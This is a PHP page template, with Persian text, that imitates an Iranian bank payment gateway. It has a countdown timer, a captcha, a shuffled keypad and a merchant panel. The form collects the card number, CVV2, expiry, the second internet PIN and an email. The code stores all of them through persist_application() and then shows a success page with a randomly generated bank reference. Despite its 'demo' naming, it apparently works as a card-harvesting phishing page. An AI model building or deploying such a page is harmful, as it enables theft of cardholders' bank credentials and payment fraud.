<?php

declare(strict_types=1);

$context = require_active_demo_payment();
$draft = $context['draft'];
$product = $context['product'];
$payment = $context['payment'];
$errors = [];
$pageTitle = 'اطلاعات کارت شما | درگاه پرداخت';
$ipgScript = true;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = (string) ($_POST['action'] ?? 'pay');
    if ($action === 'cancel') {
        if (!verify_csrf($_POST['csrf_token'] ?? null)) {
            $errors[] = 'نشست امنیتی نامعتبر است. صفحه را تازه کنید.';
        } else {
            redirect('/pay/failed?reason=cancel');
        }
    } elseif (!verify_csrf($_POST['csrf_token'] ?? null)) {
        $errors[] = 'نشست امنیتی نامعتبر است. صفحه را تازه کنید.';
    } elseif (rate_limited('pay_submit', 15, 3600)) {
        $errors[] = 'تعداد تلاش‌های پرداخت بیش از حد مجاز است. بعداً دوباره تلاش کنید.';
    } elseif (demo_payment_is_expired($payment)) {
        clear_demo_payment();
        redirect('/pay/failed?reason=timeout');
    } elseif (!verify_ipg_captcha((string) ($_POST['captcha'] ?? ''))) {
        $errors[] = 'کد امنیتی نادرست است.';
        rotate_ipg_captcha();
    } else {
        $card = ipg_card_from_post($_POST);
        $errors = validate_ipg_card($card);
        if ($errors === []) {
            try {
                $meta = payment_meta_for_extra($payment);
                $saved = persist_application($draft, $product, $meta, $card);
                $_SESSION['apply_confirmation'] = $saved['tracking_number'];
                $_SESSION['ipg_success'] = [
                    'tracking_number' => $saved['tracking_number'],
                    'order_number' => $meta['order_number'],
                    'amount_rial' => $meta['amount_rial'],
                    'reference' => str_pad((string) random_int(0, 999999999999), 12, '0', STR_PAD_LEFT),
                    'paid_at' => $meta['paid_at'],
                ];
                unset($_SESSION['apply_draft']);
                clear_demo_payment();
                redirect('/pay/success');
            } catch (InvalidArgumentException $e) {
                redirect('/apply/review');
            } catch (Throwable $e) {
                $errors[] = 'پرداخت ثبت نشد. لطفاً دوباره تلاش کنید.';
            }
        }
    }
}

$remaining = demo_payment_remaining_seconds($payment);
$keys = range(0, 9);
shuffle($keys);
require APP_ROOT . '/pages/pay/_layout_start.php';
?>

<div class="ipg-wrap">
  <section class="ipg-panel" aria-labelledby="ipg-form-title">
    <div class="ipg-form-head">
      <h1 id="ipg-form-title" class="ipg-form-title">اطلاعات کارت شما</h1>
      <p class="ipg-timer">زمان باقی مانده : <span id="ipg-timer-value"><?= e(fa_number(sprintf('%02d:%02d', intdiv($remaining, 60), $remaining % 60))) ?></span></p>
    </div>

    <?php if ($errors !== []): ?>
      <div class="ipg-error">
        <?php foreach ($errors as $error): ?><p><?= e($error) ?></p><?php endforeach; ?>
      </div>
    <?php endif; ?>

    <form id="ipg-form" method="post" action="/pay" autocomplete="off" data-remaining="<?= e((string) $remaining) ?>">
      <?= csrf_field() ?>
      <input type="hidden" name="action" value="pay">

      <div class="ipg-row">
        <label for="card_number">شماره کارت</label>
        <div class="ipg-control">
          <input class="ipg-input ipg-input-card" id="card_number" name="card_number" inputmode="numeric" maxlength="19" autocomplete="off" placeholder="6037-9911-1234-5678" required>
        </div>
      </div>

      <div class="ipg-row">
        <label for="cvv2">کد CVV2</label>
        <div class="ipg-control">
          <input class="ipg-input ipg-input-short" id="cvv2" name="cvv2" type="password" inputmode="numeric" maxlength="4" placeholder="۱۲۳" required>
          <svg class="ipg-card-hint" viewBox="0 0 54 34" aria-hidden="true">
            <rect x="1" y="4" width="38" height="26" rx="3" fill="#fff" stroke="#888"/>
            <rect x="1" y="10" width="38" height="6" fill="#444"/>
            <rect x="22" y="20" width="12" height="6" fill="#e8e8e8" stroke="#999"/>
            <text x="41" y="22" font-size="7" fill="#333">CVV2</text>
          </svg>
        </div>
      </div>

      <div class="ipg-row">
        <label>تاریخ انقضای کارت</label>
        <div class="ipg-control">
          <div class="ipg-expiry">
            <label class="ipg-expiry-item">
              <span>ماه</span>
              <input class="ipg-input" id="expiry_month" name="expiry_month" inputmode="numeric" maxlength="2" placeholder="۰۹" required>
            </label>
            <label class="ipg-expiry-item">
              <span>سال</span>
              <input class="ipg-input" id="expiry_year" name="expiry_year" inputmode="numeric" maxlength="2" placeholder="۰۵" required>
            </label>
          </div>
        </div>
      </div>

      <div class="ipg-row">
        <label for="captcha">کد امنیتی</label>
        <div class="ipg-control">
          <input class="ipg-input ipg-input-short" id="captcha" name="captcha" inputmode="numeric" maxlength="5" placeholder="۱۲۳۴۵" required>
          <img class="ipg-captcha-img" id="captcha-image" src="/pay/captcha" width="110" height="40" alt="کد امنیتی">
          <button class="ipg-refresh" id="captcha-refresh" type="button" aria-label="تازه‌سازی کد امنیتی">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
              <path d="M21 12a9 9 0 1 1-2.6-6.4" stroke-linecap="round"/>
              <path d="M21 5v5h-5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </button>
        </div>
      </div>

      <div class="ipg-row">
        <label for="pin2">رمز اینترنتی(رمز دوم)</label>
        <div class="ipg-control">
          <div class="ipg-pin-row">
            <input class="ipg-input ipg-input-pin" id="pin2" autocomplete="off" name="pin2" type="password" inputmode="numeric" maxlength="12" placeholder="۱۲۳۴۵۶" required>
            <button class="ipg-otp-btn" id="pin2-otp" type="button">رمز پویا</button>
          </div>
          <p class="ipg-otp-success" id="pin2-otp-msg" hidden>رمز پویا با موفقیت ارسال شد.</p>
        </div>
      </div>

      <div class="ipg-row">
        <label for="email">ایمیل</label>
        <div class="ipg-control">
          <input class="ipg-input" id="email" autocomplete="off" name="email" type="email" placeholder="name@example.com" autocomplete="email">
        </div>
      </div>

      <div class="ipg-actions">
        <button class="ipg-btn ipg-btn-pay" type="submit">پرداخت</button>
        <a class="ipg-btn ipg-btn-cancel" href="/pay/failed?reason=cancel">انصراف</a>
      </div>
    </form>
  </section>

  <aside class="ipg-side">
    <h2 class="ipg-keypad-title">صفحه کلید امنیتی</h2>
    <div class="ipg-keypad" id="ipg-keypad">
      <?php foreach ($keys as $digit): ?>
        <button class="ipg-key" type="button" data-key="<?= e((string) $digit) ?>"><?= e(fa_number((string) $digit)) ?></button>
      <?php endforeach; ?>
      <span></span>
      <button class="ipg-key" type="button" data-key="back" aria-label="حذف">X</button>
    </div>

    <div class="ipg-merchant">
      <div class="ipg-logo-oval">LOGO</div>
      <p class="ipg-merchant-name"><?= e($payment['merchant_name']) ?></p>
      <p class="ipg-amount"><?= e(format_rial_fa((int) $payment['amount_rial'])) ?></p>
      <p class="ipg-amount-label">(مبلغ تراکنش(ریال</p>
      <div class="ipg-meta">
        <div>شماره پذیرنده<br><b class="font-latin"><?= e(fa_number((string) $payment['merchant_number'])) ?></b></div>
        <div>شماره سفارش<br><b><?= e(fa_number((string) $payment['order_number'])) ?></b></div>
        <div>آدرس وب<br><span class="ipg-web"><?= e((string) $payment['website']) ?></span></div>
      </div>
    </div>
  </aside>
</div>

<?php require APP_ROOT . '/pages/pay/_layout_end.php'; ?>
